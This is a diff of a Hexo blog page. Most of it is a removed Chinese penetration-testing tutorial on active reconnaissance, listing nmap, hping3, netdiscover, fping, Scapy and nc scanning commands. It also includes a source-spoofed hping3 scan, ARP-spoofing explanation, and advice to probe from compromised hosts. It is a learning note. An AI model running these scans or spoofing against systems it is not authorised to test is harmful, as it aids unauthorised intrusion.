+                <a class="post-title-link" href="/2020/03/12/linux-an-zhuang/" itemprop="url">kali linux安装相关知识</a></h1>
         
 
         <div class="post-meta">
@@ -1458,6 +3250,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -1709,387 +3523,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/shen-tou-ce-shi-zhu-dong-xin-xi-shou-ji/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/12/shen-tou-ce-shi-zhu-dong-xin-xi-shou-ji/" itemprop="url">渗透测试——主动信息收集</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T20:55:39+08:00">
-                2020-03-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="主动信息收集部分"><a href="#主动信息收集部分" class="headerlink" title="主动信息收集部分"></a>主动信息收集部分</h3><h4 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h4><ul>
-<li><p>直接与目标主机交互</p>
-</li>
-<li><p>无法避免留下发文的痕迹；</p>
-</li>
-<li><p>使用受控的第三方电脑进行探测；</p>
-</li>
-<li><p>使用代理或者已经被控制的主机</p>
-</li>
-<li><p>做好被封杀的准备</p>
-</li>
-<li><p>使用噪音迷惑目标，淹没真实的探测流量</p>
-</li>
-<li><p>扫描-发送不同的探测，根据返回结果判断目标状态</p>
-</li>
-</ul>
-<h4 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h4><ul>
-<li>识别活着的主机</li>
-<li>潜在的被攻击目标</li>
-<li>输出一个IP地址列表</li>
-<li>网络2、3、4层发现</li>
-</ul>
-<p>包括ARP、IPv4、IPv6、ICMP、IPSec、TCP、UDP</p>
-<h4 id="发现——二层发现"><a href="#发现——二层发现" class="headerlink" title="发现——二层发现"></a>发现——二层发现</h4><p>优点：扫描速度快，可靠</p>
-<p>缺点：不可路由</p>
-<h5 id="Arp协议"><a href="#Arp协议" class="headerlink" title="Arp协议"></a>Arp协议</h5><ul>
-<li><p>抓包</p>
-</li>
-<li><p>arping 1.1.1.1 -c 1</p>
-</li>
-<li><p>arping 1.1.1.1 -d</p>
-<p>发现重复响应，不同mac地址拥有相同的IP时，退出返回1</p>
-<p> arp地址欺骗：在你的网络里有另外一个IP地址，声称自己是网关IP，发给网关的数据包就会发给欺骗的主机，该主机的所有者就可以在其机器上抓包，实现中间人攻击，嗅探甚至修改通过该主机传输的数据包，窃取密码，篡改数据，实现一些恶意攻击。</p>
-</li>
-<li><p>arping -c 1.1.1.1 grep “bytes from”|cut -d “ “ -f 5|cut -d “(“ -f 2 |cut -d “)” -f 1</p>
-</li>
-<li><p>脚本：</p>
-<p>arping1.sh eth0&gt;addrs</p>
-</li>
-</ul>
-<p>​       arping2.sh addrs    </p>
-<h5 id="nmap二层发现"><a href="#nmap二层发现" class="headerlink" title="nmap二层发现"></a>nmap二层发现</h5><ul>
-<li>nmap 1.1.1.1-254 -sn</li>
-<li>nmap 1.1.1.1/24 -sn</li>
-</ul>
-<p>​          -sn ping扫描，禁用端口扫描</p>
-<ul>
-<li>​    nmap -iL iplist.txt -sn （扫描文件内IP，类似arping2.sh功能）</li>
-</ul>
-<h5 id="Netdiscover–二层发现"><a href="#Netdiscover–二层发现" class="headerlink" title="Netdiscover–二层发现"></a>Netdiscover–二层发现</h5><ol>
-<li>专用于二层发现</li>
-<li>可用于无线和交换网络环境</li>
-<li>主动和被动探测</li>
-</ol>
-<p><strong>主动</strong></p>
-<p>netdiscover -i eth0 -r 192.168.1/24</p>
-<p>netdiscover -i iplist.txt</p>
-<p><strong>被动</strong></p>
-<p>netdiscover -p  #将本地网卡赋值为混杂模式，非本网卡的数据包也会被侦听到</p>
-<p>主动arp容易触发报警</p>
-<h5 id="Scapy-二层发现"><a href="#Scapy-二层发现" class="headerlink" title="Scapy-二层发现"></a>Scapy-二层发现</h5><p>•作为Python库进行调用</p>
-<p>•也可作为单独的工具使用</p>
-<p>•抓包、分析、创建、修改、注入网络流量</p>
-<p>• apt-get install python-gnuplot #安装python-gnuplot组件</p>
-<p>• Scapy  #启动Scapy</p>
-<h4 id="发现-三层发现"><a href="#发现-三层发现" class="headerlink" title="发现-三层发现"></a>发现-三层发现</h4><p>IP,icmp协议  网络控制管理层</p>
-<p>路径发现，主机网络通断的诊断</p>
-<p>优点：可路由，速度快。</p>
-<p>缺点：速度比二层慢，经常被边界防火墙过滤。</p>
-<h5 id="ping-icmp"><a href="#ping-icmp" class="headerlink" title="ping(icmp)"></a>ping(icmp)</h5><ul>
-<li>ping 192.168.1.1 -c 2（设置发包的数量）</li>
-<li>路由追踪：traceroute <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a></li>
-<li>ping -R 192.168.1.1</li>
-<li>ping 192.168.1.1 -c 1 | grep “bytes from”|cut -d “” -f 4 | cut -d “.” -f 1</li>
-</ul>
-<h5 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h5><p>OSI多层堆叠手工声称ICMP包-IP/icmp</p>
-<ul>
-<li>i=Ip()</li>
-<li>i.dst=”192.168.1.1”（目标IP地址）</li>
-<li>p=ICMP()</li>
-<li>a=str(i/p)</li>
-<li>a.display()</li>
-</ul>
-<h5 id="Nmap——三层发现"><a href="#Nmap——三层发现" class="headerlink" title="Nmap——三层发现"></a>Nmap——三层发现</h5><p>nmap -sn 192.168.1/24  (-sn在同一网段，用arp，不同网段，用ICMP)</p>
-<h5 id="fping-——三层发现"><a href="#fping-——三层发现" class="headerlink" title="fping ——三层发现"></a>fping ——三层发现</h5><ul>
-<li>fping 1.1.1.1 -c 1 （会显示包大小、响应时间、丢包率）</li>
-<li>fping -g 1.1.1.1  1.1.1.2(起始参数 结束参数)</li>
-<li>fping -g 1.1.1.0/24</li>
-<li>fping -f iplist.txt</li>
-</ul>
-<h5 id="hping——三层发现"><a href="#hping——三层发现" class="headerlink" title="hping——三层发现"></a>hping——三层发现</h5><ul>
-<li>Hping(功能强大)</li>
-<li>能够发送几乎任意TCP/IP包</li>
-<li>功能强大但每次只能扫描一个目标</li>
-<li>hping3 192.168.1.1 –icmp -c 5(发5个ping包)</li>
-<li>for addr in $(seq 1 254); do hping3 192.168.1.$addr –icmp -c 5 &gt;&gt; handle.txt &amp; done</li>
-</ul>
-<h4 id="发现——四层扫描"><a href="#发现——四层扫描" class="headerlink" title="发现——四层扫描"></a>发现——四层扫描</h4><p>优点</p>
-<ul>
-<li>可路由且结果可靠</li>
-<li>不太可能被防火墙过滤</li>
-<li>甚至可以发现所有端口都被过滤的主机</li>
-</ul>
-<p>缺点</p>
-<ul>
-<li>基于状态过滤的防火墙可能过滤扫描</li>
-<li>全端口扫描速度慢</li>
-</ul>
-<p>TCP(三次握手)</p>
-<p>未经请求的ACK-RST（非正常通信：目标在线）</p>
-<p>SYN-SYN/ACK、RST(正常通信：目标在线)</p>
-<p>UDP</p>
-<p>目标IP不在线，无响应，目标IP在线、探测的端口也是开放状态，目标主机不会回复；只有一种情况可以探测：我发向目标IP一个没有开放的端口，对方回复一个ICNP端口不可达、一去不复返。</p>
-<p>ACK—Tcp  Port—-RST(如果返回rst则在线)</p>
-<p>scapy：</p>
-<p>\1. i=IP()</p>
-<p>\2. t=TCP()</p>
-<p>3.r=(i/t)</p>
-<p>4.r[tcp].flags=’A’（表示发ack包）</p>
-<p>r[IP].dst=”1.1.1.1”</p>
-<p>a=sr1(r)</p>
-<p>a.display()(查看返回的包)</p>
-<p>a=sr1(IP(dst=”1.1.1.1”)/TCP(dport=80,flags=’A’),timeout=1)</p>
-<p>UDP—–UDP Port—–icmp</p>
-<p>1.u=UDP()</p>
-<p>2.u.deport=33333</p>
-<p>3.r=(i/u)</p>
-<p>4.a=sr1(r.timeout=1,verbose=1)</p>
-<p>5.a.display()</p>
-<p>6.a=sr1(r)</p>
-<p>port-unreachable(目标端口不可达)</p>
-<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h5><p>str1(dst=”192.168.1.1”/TCP(dport=80),timeout=1,verbose=1)</p>
-<p>操作系统莫名接受一个syn/ack包，会自动给目标服务器回复一个rst包</p>
-<h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>nmap -sS 1.1.1.1 -p 80,21,25,443</p>
-<p>可以不加-sS 默认是-sS</p>
-<p>-p 1-100 扫描1到100</p>
-<p>-p 全扫描</p>
-<p>–open 只显示open的端口</p>
-<p>nmap -sS -iL test.txt -p 80</p>
-<h5 id="hping3"><a href="#hping3" class="headerlink" title="hping3:"></a>hping3:</h5><p>hping3 1.1.1.1 –scan 80,21,25 -S</p>
-<p>hping3 1.1.1.1 –scan 0-65535 -S</p>
-<p>hping3 -c 10 -S –spoof 192.168.1.140 -p ++1 192.168.1.1</p>
-<p>-c 发包数量 –spoof欺骗伪造成另一个IP</p>
-<p>++1端口号每次+1</p>
-<h5 id="全连接端口扫描"><a href="#全连接端口扫描" class="headerlink" title="全连接端口扫描"></a>全连接端口扫描</h5><p>全连接对scapy比较困难</p>
-<p>特殊情况下隐蔽扫描无法准确检测</p>
-<p>把操作系统返回的rst包被iptable过滤掉,建立完整的连接</p>
-<p>iptables -A OUTPUT -p tcp –tcp-flags RST RST -d 192.168.1.134 -j DROP</p>
-<p>-d 目标ip</p>
-<p>scapy脚本</p>
-<p><strong>nmap:</strong></p>
-<p>nmap -sT 1.1.1.1 -p 80,21</p>
-<p>nmap -sT 1.1.1.1 -p 80-2000</p>
-<p>nmap -sT -iL test.txt -p 80</p>
-<p>不加-p 默认1000个常用端口</p>
-<p><strong>dmitry:</strong></p>
-<p>功能简单,但使用简便,默认150个做常用端口</p>
-<p>dmitry -p 1.1.1.1  //tcp扫描</p>
-<p>dmitry -p 1.1.1.1 -o output</p>
-<p>-o 保存到文件</p>
-<p><strong>nc:</strong></p>
-<p>nc -nv -w l -z 1.1.1.1 1-100</p>
-<p>-w 超时时间</p>
-<h4 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h4><ul>
-<li><p>识别开发端口上运行的应用</p>
-</li>
-<li><p>识别目标操作系统</p>
-</li>
-<li><p>提高攻击效率</p>
-<ul>
-<li>Banner捕获</li>
-<li>服务识别</li>
-<li>操作系统识别</li>
-<li>SNMP分析</li>
-<li>防火墙识别</li>
-</ul>
-<h5 id="服务扫描——banner"><a href="#服务扫描——banner" class="headerlink" title="服务扫描——banner"></a>服务扫描——banner</h5><ul>
-<li>软件开发商</li>
-<li>软件名称</li>
-<li>服务类型</li>
-<li>版本号</li>
-<li>直接发现已知的漏洞和弱点</li>
-</ul>
-</li>
-<li><p>连接建立后直接获取banner</p>
-</li>
-<li><p>另类服务识别方法</p>
-<ul>
-<li>特征行为和响应字段</li>
-<li>不同的响应可用于识别底层操作系统</li>
-</ul>
-<p><strong>Python socket</strong></p>
-<ul>
-<li><p>Socket模块用于连接网络服务</p>
-<pre><code>import socket
-bangrab=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-bangrab.connect((&quot;1.1.1.1&quot;,21))
-bangrab.recv(4096)
-bangrab.close()
-exit()</code></pre></li>
-<li><p>Banner不允许抓取，recv函数无返回将挂起！</p>
-</li>
-</ul>
-<p><strong>dmitry</strong></p>
-<ul>
-<li><code>dmitry -p 192.168.153.131</code></li>
-<li><code>dmitry -pb 192.168.153.131</code></li>
-</ul>
-<p><strong>nmap</strong></p>
-<p><code>nmap -sT 192.168.153.131 -p 22 --script=banner.nse</code></p>
-<p><strong>amap</strong></p>
-<ul>
-<li><code>amap -B 192.168.153.131 21</code></li>
-<li><code>amap -B 192.168.153.131 1-65535</code></li>
-<li><code>amap -B  192.168.153.131|grep on</code></li>
-</ul>
-<p>banner信息抓取能力有限</p>
-<p>nmap响应特征分析识别服务</p>
-<ul>
-<li>发送系列复杂的探测</li>
-<li>依据响应特征signature</li>
-<li><code>nc  -nv 1.1.1.1 80</code></li>
-<li><code>nmap 1.1.1.1 -p 80 -sV</code></li>
-</ul>
-<h5 id="服务扫描——SNMP"><a href="#服务扫描——SNMP" class="headerlink" title="服务扫描——SNMP"></a>服务扫描——SNMP</h5><ul>
-<li><p>简单网络管理协议</p>
-</li>
-<li><p>Community strings</p>
-</li>
-<li><p>信息查询或重新配置</p>
-<p>识别和绕过防火墙筛选</p>
-</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+    <a class="extend prev" rel="prev" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
   </nav>
 
 
@@ -2135,7 +3573,7 @@ exit()</code></pre></li>
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-count">38</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2146,7 +3584,7 @@ exit()</code></pre></li>
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2157,7 +3595,7 @@ exit()</code></pre></li>
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">21</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
